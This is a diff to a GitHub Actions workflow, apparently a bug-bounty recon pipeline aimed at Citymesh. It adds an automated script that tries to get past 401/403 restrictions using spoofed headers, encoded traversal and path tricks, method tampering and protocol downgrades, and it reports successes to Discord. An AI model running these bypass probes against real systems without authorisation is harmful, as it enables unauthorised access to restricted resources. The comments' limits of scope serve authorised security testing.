@@ -480,6 +480,268 @@ jobs:
             curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$DISCORD_WEBHOOK_URL"
           fi
 
+      - name: Attempt 403 bypass on restricted paths found
+        run: |
+          # Only probes paths ffuf already flagged as 401/403 — not a new broad
+          # scan. Techniques below are the standard published set (path
+          # encoding/case tricks, header spoofing, safe HTTP methods, protocol
+          # downgrade, passive Wayback Machine lookup).
+          #
+          # Deliberately EXCLUDED vs. the full published technique list, and why:
+          #  - PUT/DELETE/PATCH/POST/MKCOL/COPY/MOVE/LOCK/UNLOCK/CONNECT: these
+          #    can create, modify or delete server state. Citymesh's rules
+          #    explicitly forbid "change of system settings or conducting
+          #    delete operations" — so only read-only methods are tested
+          #    (OPTIONS, HEAD, TRACE, PROPFIND, SEARCH).
+          #  - JWT tampering: needs a real token from an authenticated session
+          #    tied to a specific app; not something to blindly automate
+          #    against arbitrary 403 paths with no context.
+          #  - Proxy/VPN IP rotation: this runs from a fixed GitHub Actions
+          #    runner IP — only the header-spoofing variant (X-Forwarded-For
+          #    etc., already included) is meaningful here.
+          #  - Alternate subdomains/ports: guessing new hosts at scale
+          #    reintroduces the same enumeration concerns already handled by
+          #    the subfinder stage, and risks probing hosts/ports outside the
+          #    prioritized list. Worth doing manually on a promising finding.
+          cat > bypass_check.py << 'PYEOF'
+          import urllib.request, urllib.error, http.client, urllib.parse, time, json
+
+          TIMEOUT = 8
+          DELAY = 0.3
+          UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+
+          # Read-only HTTP methods only — see exclusions above for why the
+          # state-changing verbs from the article aren't tested here.
+          SAFE_METHODS = ["OPTIONS", "HEAD", "TRACE", "PROPFIND", "SEARCH"]
+
+
+          def request_status(url, method="GET", headers=None, timeout=TIMEOUT):
+              hdrs = {"User-Agent": UA}
+              if headers:
+                  hdrs.update(headers)
+              try:
+                  req = urllib.request.Request(url, method=method, headers=hdrs)
+                  with urllib.request.urlopen(req, timeout=timeout) as r:
+                      return r.status
+              except urllib.error.HTTPError as e:
+                  return e.code
+              except Exception:
+                  return None
+
+
+          def http10_status(url, timeout=TIMEOUT):
+              # HTTP/1.0 downgrade — some servers apply access rules only under 1.1+
+              try:
+                  parsed = urllib.parse.urlparse(url)
+                  conn_cls = http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
+                  port = parsed.port or (443 if parsed.scheme == "https" else 80)
+                  conn = conn_cls(parsed.hostname, port, timeout=timeout)
+                  conn._http_vsn = 10
+                  conn._http_vsn_str = "HTTP/1.0"
+                  path = parsed.path or "/"
+                  if parsed.query:
+                      path += "?" + parsed.query
+                  conn.request("GET", path, headers={"User-Agent": UA, "Host": parsed.hostname})
+                  resp = conn.getresponse()
+                  status = resp.status
+                  conn.close()
+                  return status
+              except Exception:
+                  return None
+
+
+          def wayback_snapshot(url):
+              # Passive only — queries archive.org, never touches the target,
+              # so it doesn't count against Citymesh's rate limit at all.
+              try:
+                  api = "https://archive.org/wayback/available?url=" + urllib.parse.quote(url, safe="")
+                  req = urllib.request.Request(api, headers={"User-Agent": UA})
+                  with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
+                      data = json.loads(r.read().decode("utf-8", "ignore"))
+                  snap = (data.get("archived_snapshots") or {}).get("closest")
+                  if snap and snap.get("available"):
+                      return snap.get("url")
+              except Exception:
+                  pass
+              return None
+
+
+          def split_url(url):
+              scheme_sep = url.find("://") + 3
+              host_end = url.find("/", scheme_sep)
+              if host_end == -1:
+                  return url, "/"
+              return url[:host_end], url[host_end:]
+
+
+          def build_path_variants(url):
+              base, path = split_url(url)
+              if not path.startswith("/"):
+                  path = "/" + path
+              trimmed = path.rstrip("/")
+              last_seg = trimmed.rsplit("/", 1)[-1] if trimmed else ""
+              parent = trimmed[: -len(last_seg)] if last_seg else trimmed
+
+              variants = [
+                  # trailing slash / dot / whitespace tricks
+                  path + "/",
+                  path.rstrip("/"),
+                  trimmed + ".",
+                  trimmed + "%20",
+                  trimmed + "%2e",
+                  # encoded traversal / slash tricks
+                  "/%2e%2e" + trimmed,
+                  "/%2e%2e%2f" + last_seg if last_seg else path,
+                  "/%2e%2e/%2e%2e" + trimmed,
+                  trimmed + "%2f",
+                  trimmed.replace("/", "//", 1),
+                  trimmed + "%252f",
+                  # semicolon / path-parameter confusion (Tomcat-style)
+                  parent + "..;/" + last_seg if last_seg else path,
+                  "/..;" + trimmed,
+                  # unicode slash bypasses
+                  trimmed + "%c0%af",
+                  trimmed + "%ef%bc%8f",
+                  # null byte truncation (mostly legacy stacks, cheap to try)
+                  trimmed + "%00.html",
+                  trimmed + "%00.json",
+              ]
+
+              # common extensions — trimmed set to bound request volume
+              for ext in [".json", ".html", ".php", ".bak", ".old"]:
+                  variants.append(trimmed + ext)
+
+              # case manipulation on the last path segment only
+              if last_seg:
+                  for cased in {last_seg.upper(), last_seg.lower(), last_seg.swapcase()}:
+                      if cased != last_seg:
+                          variants.append(parent + cased)
+
+              # query parameter tampering (path unchanged, params appended)
+              for param in ["unused_param=1", "debug=true", "access=granted", "redirect=allowed"]:
+                  variants.append(path + "?" + param)
+
+              seen = set()
+              out = []
+              for v in variants:
+                  full = base + v if not v.startswith("http") else v
+                  if full not in seen:
+                      seen.add(full)
+                      out.append(full)
+              return base, path, out
+
+
+          def build_header_variants(url):
+              _, path = split_url(url)
+              return [
+                  {"X-Original-URL": path},
+                  {"X-Rewrite-URL": path},
+                  {"X-Forwarded-For": "127.0.0.1"},
+                  {"X-Forwarded-Host": "127.0.0.1"},
+                  {"X-Custom-IP-Authorization": "127.0.0.1"},
+                  {"X-Client-IP": "127.0.0.1"},
+                  {"True-Client-IP": "127.0.0.1"},
+                  {"X-Real-IP": "127.0.0.1"},
+                  {"X-Host": "localhost"},
+                  {"Referer": url},
+              ]
+
+
+          def try_target(url):
+              # Returns a finding string if any technique succeeds, else None.
+              # Order runs cheapest/likely-first so a hit exits early.
+
+              # 1) header spoofing
+              for hdrs in build_header_variants(url):
+                  code = request_status(url, method="GET", headers=hdrs)
+                  time.sleep(DELAY)
+                  if code and 200 <= code < 300:
+                      hdr_str = ", ".join(f"{k}: {v}" for k, v in hdrs.items())
+                      return f"{url} -> bypass via header [{hdr_str}] returned {code}"
+
+              # 2) path encoding / case / extension / query tricks
+              base, path, variants = build_path_variants(url)
+              for variant_url in variants:
+                  code = request_status(variant_url, method="GET")
+                  time.sleep(DELAY)
+                  if code and 200 <= code < 300:
+                      return f"{url} -> bypass via path variant '{variant_url}' returned {code}"
+
+              # 3) safe read-only method tampering
+              for method in SAFE_METHODS:
+                  code = request_status(url, method=method)
+                  time.sleep(DELAY)
+                  if code and 200 <= code < 300:
+                      return f"{url} -> bypass via method {method} returned {code}"
+
+              # 4) scheme downgrade (https -> http) on the same host+path
+              if url.startswith("https://"):
+                  http_url = "http://" + url[len("https://"):]
+                  code = request_status(http_url, method="GET")
+                  time.sleep(DELAY)
+                  if code and 200 <= code < 300:
+                      return f"{url} -> bypass via HTTP downgrade '{http_url}' returned {code}"
+
+              # 5) HTTP/1.0 protocol downgrade
+              code = http10_status(url)
+              time.sleep(DELAY)
+              if code and 200 <= code < 300:
+                  return f"{url} -> bypass via HTTP/1.0 downgrade returned {code}"
+
+              # 6) passive Wayback Machine check — zero requests to the target
+              snap = wayback_snapshot(url)
+              if snap:
+                  return f"{url} -> historical snapshot available on Wayback Machine: {snap}"
+
+              return None
+
+
+          def main():
+              findings = []
+              with open("results/ffuf_current.txt") as f:
+                  lines = [l.strip() for l in f if l.strip()]
+
+              targets = []
+              for line in lines:
+                  if line.endswith("[401]") or line.endswith("[403]"):
+                      targets.append(line.rsplit(" [", 1)[0])
+              targets = targets[:20]  # cap request volume per run
+
+              for url in targets:
+                  result = try_target(url)
+                  if result:
+                      findings.append(result)
+
+              with open("results/bypass_current.txt", "w") as out:
+                  for f in sorted(set(findings)):
+                      out.write(f + "\n")
+
+
+          if __name__ == "__main__":
+              main()
+          PYEOF
+
+          python3 bypass_check.py
+          sort -u results/bypass_current.txt -o results/bypass_current.txt 2>/dev/null || touch results/bypass_current.txt
+      - name: Diff 403 bypass findings against previous run
+        id: bypass_diff
+        run: |
+          if [ -f results/bypass_previous.txt ]; then
+            comm -13 results/bypass_previous.txt results/bypass_current.txt > results/bypass_new.txt
+          else
+            cp results/bypass_current.txt results/bypass_new.txt
+          fi
+          NEW_BYPASSES=$(wc -l < results/bypass_new.txt | tr -d ' ')
+          echo "new_bypasses=$NEW_BYPASSES" >> "$GITHUB_OUTPUT"
+
+      - name: Notify Discord if new 403 bypass found
+        if: steps.bypass_diff.outputs.new_bypasses != '0'
+        run: |
+          BYPASSES=$(head -c 1700 results/bypass_new.txt)
+          CONTENT=$(printf "**403 bypass succeeded (Citymesh) — verify manually before reporting:**\n\`\`\`\n%s\n\`\`\`" "$BYPASSES")
+          PAYLOAD=$(jq -n --arg content "$CONTENT" '{content: $content}')
+          curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$DISCORD_WEBHOOK_URL"
+
       - name: Discover JS files with katana
         run: |
           katana -list results/current_alive_hosts.txt \
@@ -544,13 +806,14 @@ jobs:
           cp results/current_alive_hosts.txt results/previous_alive_hosts.txt
           cp results/nuclei_current.txt results/nuclei_previous.txt
           cp results/ffuf_current.txt results/ffuf_previous.txt
+          cp results/bypass_current.txt results/bypass_previous.txt
           cp results/js_secrets_current.txt results/js_secrets_previous.txt
 
       - name: Commit updated results
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add results/previous.txt results/previous_alive.txt results/previous_alive_hosts.txt results/nuclei_previous.txt results/ffuf_previous.txt results/js_secrets_previous.txt
+          git add results/previous.txt results/previous_alive.txt results/previous_alive_hosts.txt results/nuclei_previous.txt results/ffuf_previous.txt results/bypass_previous.txt results/js_secrets_previous.txt
           git diff --cached --quiet || git commit -m "Update baselines [skip ci]"
           git push
 
@@ -565,6 +828,8 @@ jobs:
           FUZZED_HOSTS=$(wc -l < results/ffuf_targets.txt 2>/dev/null | tr -d ' ' || echo 0)
           TOTAL_PATHS=$(wc -l < results/ffuf_current.txt 2>/dev/null | tr -d ' ' || echo 0)
           NEW_PATHS=$(wc -l < results/ffuf_new.txt 2>/dev/null | tr -d ' ' || echo 0)
+          TOTAL_BYPASSES=$(wc -l < results/bypass_current.txt 2>/dev/null | tr -d ' ' || echo 0)
+          NEW_BYPASSES=$(wc -l < results/bypass_new.txt 2>/dev/null | tr -d ' ' || echo 0)
           JS_FILES_SCANNED=$(wc -l < results/js_urls_current.txt 2>/dev/null | tr -d ' ' || echo 0)
           TOTAL_SECRETS=$(wc -l < results/js_secrets_current.txt 2>/dev/null | tr -d ' ' || echo 0)
           NEW_SECRETS=$(wc -l < results/js_secrets_new.txt 2>/dev/null | tr -d ' ' || echo 0)
@@ -582,10 +847,11 @@ jobs:
             echo "| Nuclei findings | $TOTAL_NUCLEI | $NEW_NUCLEI |"
             echo "| Hosts fuzzed ($FUZZED_HOSTS/$ALIVE_SUBS, AI-prioritized: $PRIORITIZED) | — | — |"
             echo "| Directory paths | $TOTAL_PATHS | $NEW_PATHS |"
+            echo "| 403 bypasses found | $TOTAL_BYPASSES | $NEW_BYPASSES |"
             echo "| JS files scanned | $JS_FILES_SCANNED | — |"
             echo "| Possible JS secrets | $TOTAL_SECRETS | $NEW_SECRETS |"
             echo ""
-            if [ "$NEW_SUBS" = "0" ] && [ "$NEW_NUCLEI" = "0" ] && [ "$NEW_PATHS" = "0" ] && [ "$NEW_SECRETS" = "0" ]; then
+            if [ "$NEW_SUBS" = "0" ] && [ "$NEW_NUCLEI" = "0" ] && [ "$NEW_PATHS" = "0" ] && [ "$NEW_BYPASSES" = "0" ] && [ "$NEW_SECRETS" = "0" ]; then
               echo "No new findings this run — baseline unchanged."
             else
               echo "New findings this run — check Discord for details, or the \`results/\` artifacts below."
